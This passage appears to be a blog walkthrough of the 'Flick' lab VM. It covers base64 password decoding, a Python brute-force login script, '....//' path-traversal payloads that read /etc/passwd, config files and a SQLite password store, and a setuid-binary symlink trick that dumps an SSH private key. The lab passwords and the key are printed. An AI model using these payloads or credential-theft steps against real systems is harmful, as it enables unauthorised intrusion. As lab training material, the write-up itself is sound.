yRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&rsquo;</p>

<p>count = 0
while True:</p>

<pre><code>try:
    secret = base64.b64decode(secret)
    print 'Try ' + str(count) + ': ' + secret
    count += 1
except TypeError:
    print 'Done'
    break
</code></pre>

<p>```</p>

<p>It took 16 decodings to produce a non Base64 string that might work as password for the admin server. The end result is <code>tabupJievas8Knoj</code></p>

<p>``` plain
root@kali:~# nc 192.168.80.129 8881
Welcome to the admin server. A correct password will &lsquo;flick&rsquo; the switch and open a new door:</p>

<blockquote><p>tabupJievas8Knoj
OK: tabupJievas8Knoj</p></blockquote>

<p>Accepted! The door should be open now :poolparty:</p>

<blockquote><p>```</p></blockquote>

<p>I tried poolparty as the SSH password but of course it wouldn&rsquo;t be that easy! We started with only 2 open ports, so there isn&rsquo;t much room for progression on that front, but what door is open now? I started another Nmap scan, and there is indeed something that wasn&rsquo;t here before:</p>

<p><code>plain
...
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Flick-a-Photo
...
</code></p>

<p><img class="center" src="/images/pentest/flick/cats.png" title="&lsquo;flick a photo&rsquo; &lsquo;flick cats&rsquo;" ></p>

<p>It&rsquo;s an image gallery of cats. After you feasted your eyes on all of them, check the login page:</p>

<p><img class="center" src="/images/pentest/flick/login.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Right, I don&rsquo;t see any credentials lying around in the source. I tried modifying the URL from <code><a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a></code>, and there is a directory index coming up, but it&rsquo;s fake:</p>

<p><img class="center" src="/images/pentest/flick/index.png" title="&lsquo;fake index&rsquo; &lsquo;index&rsquo;" ></p>

<p>You get the same page no matter what you add in the URL or click on the supposed directories. I tried SQL injection next. If you insert a single quote, you get this message:</p>

<p><code>plain
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND user.password=' at line 1
</code></p>

<p>But this message remains unchanged no matter the variation of the injections, and there is no reaction if you try double quotes or backslashes. I tested it with Sqlmap and it reported that none of the parameters are dynamic nor injectable, so it seems like another fake lead.</p>

<p>Right, so it&rsquo;s time to focus on the hint. I tried logging in with <em>demo:demo</em>, but it didn&rsquo;t work. Because the hint specified a demo user, it&rsquo;s safe to assume the username will be demo. And with no other hint, and lengthy bruteforcing not being a desired goal of the exercise, we can assume that the password is also some variation that includes the word demo. Most likely an addition of a few digits. Whenever I think the password would be weak and obvious, or I am clueless and hope for the best, I try the obvious word by itself, or followed by 123 or 1234. I never really expect it to work, but..it did! The password is actually <em>demo123</em>. However, for the sake of exercise, let&rsquo;s assume we didn&rsquo;t imagine any possible password and we need to do it conventionally..by building a wordlist and bruteforcing the login page.</p>

<p>So, the first step is to build a wordlist. If we think about it, the password will most likely contain the word demo, so its minimum length would be 5 (already tried demo), and its maximum would be 8, to accommodate some trailing digits / letters, or a repetition of the word itself. I will give 2 examples of creating a wordlist, but will use a much reduced list for the actual bruteforcing part.</p>

<p>In the first example, I used crunch to generate a wordlist. To keep up with the constraints, it should be composed of 5-8 characters, with the string &ldquo;demo&rdquo; occurring at the beginning or the end. I assummed the letters would be lowercase only.</p>

<p>``` plain
crunch 7 7 -t demo%%% -o /root/Desktop/wordlist.txt
Crunch will now generate the following amount of data: 8000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000</p>

<p>crunch: 100% completed generating output
&hellip;
crunch 7 7 -t demo@@@ -o /root/Desktop/wordlist2.txt
Crunch will now generate the following amount of data: 140608 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 17576</p>

<p>crunch: 100% completed generating output
```</p>

<p>In this example, I specified the min and max length as 7 (since I couldn&rsquo;t figure out from my speedy reading how to make crunch to build variable length words from the pattern, to build a full wordlist I would repeat it for every length and pattern that must be met and merge the results). The <em>-o</em> parameter is for the output file, and the <em>-t</em> parameter is for the pattern, followed by wildcard symbols (<em>%</em> for numbers, <em>@</em> for lowercase).</p>

<p>The second example will use our buddy, John the Ripper. Starting from a file called demo.txt, which only has the word demo in it, I let john build passwords originating from the word demo by using the jumbo rules from <code>/etc/john/john.conf</code></p>

<p><code>plain
john --rules=jumbo --wordlist=demo.txt --stdout &gt;&gt; wordlist.txt
words: 5116  time: 0:00:00:00 DONE (Wed Feb 11 14:44:42 2015)  w/s: 102320  current: DEMO
</code></p>

<p>This wordlist also contains uppercase variations. Here&rsquo;s a breakdown of the command:</p>

<ul>
<li><strong>&mdash;rules=jumbo</strong> Enables wordlist rules, that are read from [List.Rules:Wordlist]
                  in  /etc/john/john.conf  (or  the alternative configuration file
                  you might specify on the command line).
                  This option requires the -wordlist option to be passed as well.</li>
</ul>


<p>And the jumbo rules from john&rsquo;s configuration file:</p>

<p>``` plain</p>

<h1>For Wordlist mode and very fast hashes</h1>

<p>[List.Rules:Jumbo]
.include [List.Rules:Wordlist]
.include [List.Rules:Single]
.include [List.Rules:Extra]
.include [List.Rules:NT]
```</p>

<p>So this actually includes 4 other rules.</p>

<ul>
<li><p><strong>&mdash;wordlist=demo.txt</strong> These are used to enable the wordlist mode, reading  words  from FILE.</p></li>
<li><p><strong>&mdash;stdout >> wordlist.txt</strong> When used with a cracking mode, except for &ldquo;single crack&rdquo;, makes
                             John print the words it generates to stdout instead of cracking.</p></li>
</ul>


<p>Since we aren&rsquo;t cracking anything, we redirect the passwords to a file.</p>

<p>Next, for the bruteforcing part, I will use just a few samples to illustrate the exercise.</p>

<p><code>plain
root@kali:~/Desktop# cat wordlist.txt
demodemo
demo007
demo123
</code></p>

<p>I wrote a Python script to attempt the login:</p>

<p>``` python
import urllib, urllib2
import cookielib</p>

<p>wordlist = &lsquo;/root/Desktop/wordlist.txt&rsquo;
passwords = []
with open(wordlist, &lsquo;r&rsquo;) as f:</p>

<pre><code>for line in f.readlines():
    passwords.append(line.strip('\n'))
</code></pre>

<p>url = &lsquo;<a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a>&rsquo; <br/>
fail = &lsquo;Your username/password combination was incorrect&rsquo;</p>

<p>username = &lsquo;demo&rsquo;
password = &lsquo;&rsquo;</p>

<p>jar = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
opener.addheaders.append((&lsquo;Cookie&rsquo;, &lsquo;laravel_session=eyJpdiI6IkxSQlRpb1NyTDc1VDZNMG9jaGZiUDRNbmxXNlgxbUVFWllZXC9Jemp4a0RzPSIsInZhbHVlIjoiTUVkd1VXMkxLY2p1czJFc1B5aTA0eG9hb3A3Zmt2cHJlWlNSMEFkMW54cmJFNmk3VFluaE9qTlgydVlGVStGenI0RjdiR2JHc3h4Y1wvZFBkM3JTa1N3PT0iLCJtYWMiOiJiNzk4NGEwMzQzN2Y4YTM4OWVhOTZjODM2YzRiMjI5ODM2MTFlNGQxMzM3NjA4ZjQ5M2EyOTNmYTE5NGNiMDZmIn0%3D&rsquo;))</p>

<p>for passwd in passwords:</p>

<pre><code>print 'Trying: ' + passwd
payload = {'_token': 'p8xqSfrmqsYs7jvIpZbnoMG03FRxQYueO2LAcWAp',
           'username': 'demo',
           'password': passwd}
data = urllib.urlencode(payload)
req = opener.open(url, data)
if fail not in req.read():
    print 'Success with password: ' + passwd
    break
</code></pre>

<p>```</p>

<p>And its output:</p>

<p><code>plain
Trying: demodemo
Trying: demo007
Trying: demo123
Success with password: demo123
</code></p>

<p>After all the work (or guessing) to log in, the only extra things we can do is upload photos or download photos from the gallery. First, I tried uploading a PHP file to see if I could get code execution, but it didn&rsquo;t work. All I could see was a blank page.</p>

<p>Next thing I tried was LFI (local file inclusion). When downloading images, you can see the URL looks like this: <code><a href="http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt">http://192.168.80.129/image/download?filename=images/mPTRlZ8Bf3Wt</a></code>. So I tried to read <em>/etc/passwd</em> in the most straightforward way: <code><a href="http://192.168.80.129/image/download?filename=../../../../etc/passwd">http://192.168.80.129/image/download?filename=../../../../etc/passwd</a></code>. Upon doing this, I got the following message:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>etc/passwd is not valid.
```</p>

<p>So everything was removed from my attempt. It&rsquo;s most likely there is a filter in place. Let&rsquo;s see. When I tried <code><a href="http://192.168.80.129/image/download?filename=../../../.././etc/passwd">http://192.168.80.129/image/download?filename=../../../.././etc/passwd</a></code>, I got a slightly different error:</p>

<p>``` plain
Oops! Looks like you requested a invalid file to download!</p>

<p>./etc/passwd is not valid.
```</p>

<p>Ok, so to bypass the filter I used <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</code>. This prompted me to download an image, and I wasted time trying to figure out why it wouldn&rsquo;t work. Trying to view the image I got the error that it can&rsquo;t be displayed because it contains errors. Finally it struck me to run strings on it and:</p>

<p><code>plain
root@kali:~/Desktop# strings image.jpg
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
</code></p>

<p>Finally getting somewhere! To the bottom we can see potentially interesting users, robin and dean. But how to actually get in the box?</p>

<p>Well, the answer lies in combining the ability to read local files with some knowledge of the framework used behind the scenes. Remember the <code>laravel_session</code> cookie? Laravel is a &ldquo;PHP Framework For Web Artisans&rdquo;. The official documentation is a great place to get started. While looking around, I hit this <a href="http://laravel.com/docs/5.0/database">database</a> page, and read about a file that we might be interested in: <code>config/database.php</code>. This is the config file for the database, where you can specify the connections' details. And it&rsquo;s important for us, because it should contain usernames and passwords. Also, if you check the laravel <a href="http://laravel.com/docs/5.0/configuration">configuration</a> page, you will notice that the default installation directory is named <em>app</em>. To read the file we want, we would have to look for it under <code>app/config/database.php</code>. But before that, we have to know the root of the website. At this point I had to do some online reading, because I couldnt find the <em>httpd.conf</em> file, and some other files I&rsquo;ve pulled from the server weren&rsquo;t helpful. The one that contained the necessary information was <code>/etc/apache2/sites-enabled/000-default</code>. Since I have yet to seriously start playing with Apache, I&rsquo;m not very knowledgeable about its workings, but this file is a symbolic link to <code>/etc/apache2/sites-available/default</code>. In the <code>/sites-available/</code> folder there are configuration files for every site that you want to serve (in Apache, these are called virtual hosts). The <em>default</em> site is, uhm, just that, the default site of the Apache installation. And in the <code>/sites-enabled/</code> directory there are symbolic links for every active site (that you&rsquo;re actually serving). Hence the file that we&rsquo;re requesting is a symbolic link to the default site that&rsquo;s being served.</p>

<p>Back to the problem at hand, I downloaded the file as follows: <code>192.168.80.129/image/download?filename=&hellip;.//&hellip;.//&hellip;.//&hellip;.///etc/apache2/sites-enabled/000-default</code> and ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<VirtualHost *:80></p>

<pre><code>ServerAdmin webmaster@localhost
DocumentRoot /var/www/flick_photos/public
&lt;Directory /&gt;
    Options FollowSymLinks
    AllowOverride None
&lt;/Directory&gt;
&lt;Directory /var/www/flick_photos/public&gt;
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all
&lt;/Directory&gt;
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
&lt;Directory "/usr/lib/cgi-bin"&gt;
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Order allow,deny
    Allow from all
&lt;/Directory&gt;
ErrorLog ${APACHE_LOG_DIR}/error.log
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
LogLevel warn
CustomLog ${APACHE_LOG_DIR}/access.log combined
Alias /doc/ "/usr/share/doc/"
&lt;Directory "/usr/share/doc/"&gt;
    Options Indexes MultiViews FollowSymLinks
    AllowOverride None
    Order deny,allow
    Deny from all
    Allow from 127.0.0.0/255.0.0.0 ::1/128
&lt;/Directory&gt;
</code></pre>

<p></VirtualHost>
```</p>

<p>Great! With this knowledge, we have a way to search for the Laravel database file: <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/config/database.php</a></code>. Again, to read it, I ran strings on it:</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
&lt;?php
return array(</p>

<pre><code>|--------------------------------------------------------------------------
| PDO Fetch Style
|--------------------------------------------------------------------------
| By default, database results will be returned as instances of the PHP
| stdClass object; however, you may desire to retrieve records in an
| array format for simplicity. Here you can tweak the fetch style.
'fetch' =&gt; PDO::FETCH_CLASS,
|--------------------------------------------------------------------------
| Default Database Connection Name
|--------------------------------------------------------------------------
| Here you may specify which of the database connections below you wish
| to use as your default connection for all database work. Of course
| you may use many connections at once using the Database library.
// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
// on to the new and improved MySQL database. So, I will just comment out this as it is
// no longer in use
//'default' =&gt; 'sqlite',
'default' =&gt; 'mysql',
|--------------------------------------------------------------------------
| Database Connections
|--------------------------------------------------------------------------
| Here are each of the database connections setup for your application.
| Of course, examples of configuring each database platform that is
| supported by Laravel is shown below to make development simple.
| All database work in Laravel is done through the PHP PDO facilities
| so make sure you have the driver for your particular database of
| choice installed on your machine before you begin development.
'connections' =&gt; array(
    'sqlite' =&gt; array(
        'driver'   =&gt; 'sqlite',
        'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
        'prefix'   =&gt; '',
    ),
    'mysql' =&gt; array(
        'driver'    =&gt; 'mysql',
        'host'      =&gt; 'localhost',
        'database'  =&gt; 'flick',
        'username'  =&gt; 'flick',
        'password'  =&gt; 'resuddecNeydmar3',
        'charset'   =&gt; 'utf8',
        'collation' =&gt; 'utf8_unicode_ci',
        'prefix'    =&gt; '',
    ),
    'pgsql' =&gt; array(
        'driver'   =&gt; 'pgsql',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'forge',
        'username' =&gt; 'forge',
        'password' =&gt; '',
        'charset'  =&gt; 'utf8',
        'prefix'   =&gt; '',
        'schema'   =&gt; 'public',
    ),
    'sqlsrv' =&gt; array(
        'driver'   =&gt; 'sqlsrv',
        'host'     =&gt; 'localhost',
        'database' =&gt; 'database',
        'username' =&gt; 'root',
        'password' =&gt; '',
        'prefix'   =&gt; '',
    ),
|--------------------------------------------------------------------------
| Migration Repository Table
|--------------------------------------------------------------------------
| This table keeps track of all the migrations that have already run for
| your application. Using this information, we can determine which of
| the migrations on disk haven't actually been run in the database.
'migrations' =&gt; 'migrations',
|--------------------------------------------------------------------------
| Redis Databases
|--------------------------------------------------------------------------
| Redis is an open source, fast, and advanced key-value store that also
| provides a richer set of commands than a typical key-value systems
| such as APC or Memcached. Laravel makes it easy to dig right in.
'redis' =&gt; array(
    'cluster' =&gt; false,
    'default' =&gt; array(
        'host'     =&gt; '127.0.0.1',
        'port'     =&gt; 6379,
        'database' =&gt; 0,
    ),
</code></pre>

<p>```</p>

<p>Unfortunately, there were no passwords here, but it seems we should investigate further:</p>

<p><code>plain
'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
</code></p>

<p>So I went to download the sqlite file from <code><a href="http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite">http://192.168.80.129/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite</a></code>, and this one was the jackpot!</p>

<p>``` plain
root@kali:~/Desktop# strings image.jpg
<strong> This file contains an SQLite 2.1 database </strong>
 &ldquo;^table
old_users
old_users
CREATE TABLE old_users (
  username text,
  password text
Ipaul
nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi</p>

<pre><code>Jrobin
</code></pre>

<p>JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1</p>

<pre><code>Jjames
</code></pre>

<p>scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5
Idean
FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
```</p>

<p>Passwords for the users we discovered earlier in the <em>/etc/passwd</em> file! I tried SSH'ing, and robin&rsquo;s password didn&rsquo;t work, but dean&rsquo;s did!</p>

<p>``` plain
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Fri Feb 13 14:34:19 SAST 2015</p>

<p>  System load:  0.0               Processes:              82
  Usage of /:   36.1% of 6.99GB   Users logged in:        0
  Memory usage: 39%               IP address for eth0:    192.168.80.129
  Swap usage:   0%                IP address for docker0: 172.17.42.1</p>

<p>  Graph this data and manage this system at:</p>

<pre><code>https://landscape.canonical.com/
</code></pre>

<p>New release &lsquo;14.04.1 LTS&rsquo; available.
Run &lsquo;do-release-upgrade&rsquo; to upgrade to it.</p>

<p>Last login: Sat Aug  2 14:42:15 2014 from 192.168.56.1
dean@flick:~$ ls
message.txt  read_docker
```</p>

<p>The message is as follows:</p>

<p>``` plain
dean@flick:~$ cat message.txt
&mdash;&mdash;-BEGIN PGP SIGNED MESSAGE&mdash;&mdash;&ndash;
Hash: SHA1</p>

<p>Hi Dean,</p>

<p>I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.</p>

<p>The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/</p>

<p>Please call me if you have any troubles!</p>

<hr />

<p>Ciao
Robin
&mdash;&mdash;-BEGIN PGP SIGNATURE&mdash;&mdash;&ndash;
Version: GnuPG v1</p>

<p>iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
&mdash;&mdash;-END PGP SIGNATURE&mdash;&mdash;&ndash;
```</p>

<p>Before continuing, if you wonder <a href="https://www.docker.com/whatisdocker/">what is docker?</a>:</p>

<blockquote><p>Docker is an open platform for developers and sysadmins to build, ship, and run distributed applications. Consisting of
Docker Engine, a portable, lightweight runtime and packaging tool, and Docker Hub, a cloud service for sharing applications
and automating workflows, Docker enables apps to be quickly assembled from components and eliminates the friction between
development, QA, and production environments. As a result, IT can ship  faster and run the same app, unchanged, on laptops,
data center VMs, and any cloud.</p></blockquote>

<p>So, I used the script to read robin&rsquo;s dockerfile, per the instructions:</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/robin/flick-dev/</p>

<h1>Flick-a-photo dev env</h1>

<p>RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</p>

<p>CMD [&ldquo;/usr/sbin/apache2&rdquo;, &ldquo;-D&rdquo;, &ldquo;FOREGROUND&rdquo;]
```</p>

<p>At this point, it wasn&rsquo;t exactly clear to me how to continue, so I looked at the executable itself:</p>

<p>``` plain
dean@flick:~$ file read_docker
read_docker: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5b429ab297ac0bd55150f9ef54738b366f643336, not stripped</p>

<p>dean@flick:~$ strings read_docker
/lib64/ld-linux-x86-64.so.2
sT63do
<strong>gmon_start</strong>
libc.so.6
sprintf
fopen
fgetc
memset
stdout
fputc
fclose
malloc
stderr
fwrite
fprintf
__libc_start_main
free
GLIBC_2.2.5
%z <br/>
%r <br/>
%j <br/>
%b <br/>
%Z <br/>
%R <br/>
%J <br/>
%B <br/>
%: <br/>
fff.
l$ L
t$(L
|$0H
/Dockerfile
ERROR: A path is required!
Usage is: %s /path/to/dockerfile
%s%s
ERROR: the specified docker file doesn&rsquo;t exist: %s
;*3$&ldquo;
```</p>

<p>Well, this is a SUID binary, and the owner is robin, so we should be able to read files that robin has permissions to read..or so I thought:</p>

<p><code>plain
dean@flick:~$ ./read_docker /home/robin/.bash_history
ERROR: the specified docker file doesn't exist: /home/robin/.bash_history/Dockerfile
Usage is: ./read_docker /path/to/dockerfile
</code></p>

<p>So it appears to append a Dockerfile to the path that you enter. Judging from this, it won&rsquo;t be able to read the contents if there is no Dockerfile present. But what if we create a Dockerfile in dean&rsquo;s home directory and link it to stuff that robin should have access to? I still couldn&rsquo;t read the <em>.bash_history</em> file, so there probably isn&rsquo;t one, but..</p>

<p><code>plain
ean@flick:~$ ln -s /home/robin/.bashrc Dockerfile
dean@flick:~$ ls -la
total 44
drwxr-xr-x 3 dean  dean  4096 Feb 23 13:54 .
drwxr-xr-x 4 root  root  4096 Aug  2  2014 ..
-rw------- 1 dean  dean   143 Feb 13 15:46 .bash_history
-rw-r--r-- 1 dean  dean   220 Aug  2  2014 .bash_logout
-rw-r--r-- 1 dean  dean  3486 Aug  2  2014 .bashrc
drwx------ 2 dean  dean  4096 Aug  2  2014 .cache
lrwxrwxrwx 1 dean  dean    19 Feb 23 13:54 Dockerfile -&gt; /home/robin/.bashrc
-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
-rw-r--r-- 1 dean  dean   675 Aug  2  2014 .profile
-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
</code></p>

<p>If you look at the link you created, it says it&rsquo;s a broken symbolic link:</p>

<p><code>plain
dean@flick:~$ file Dockerfile
Dockerfile: broken symbolic link to `/home/robin/.bashrc'
</code></p>

<p>However, that doesn&rsquo;t seem to stop the <em>read_docker</em> binary from doing its thing!</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/dean</p>

<h1>~/.bashrc: executed by bash(1) for non-login shells.</h1>

<h1>see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</h1>

<h1>for examples</h1>

<h1>If not running interactively, don&rsquo;t do anything</h1>

<p>[ -z &ldquo;$PS1&rdquo; ] &amp;&amp; return</p>

<h1>don&rsquo;t put duplicate lines or lines starting with space in the history.</h1>

<h1>See bash(1) for more options</h1>

<p>HISTCONTROL=ignoreboth</p>

<h1>append to the history file, don&rsquo;t overwrite it</h1>

<p>shopt -s histappend</p>

<h1>for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</h1>

<p>HISTSIZE=1000
HISTFILESIZE=2000
&hellip;
```</p>

<p>So,we were able to read robin&rsquo;s <em>.bashrc</em> file. That doesn&rsquo;t help us much, but now we know that we can use this to our advantage, if the file that we want to read exists. Let&rsquo;s see if we can&rsquo;t get robin&rsquo;s SSH private key:</p>

<p>``` plain
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ls -la Dockerfile
lrwxrwxrwx 1 dean dean 23 Feb 23 14:06 Dockerfile &ndash;> /home/robin/.ssh/id_rsa</p>

<p>dean@flick:~$ ./read_docker /home/dean
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

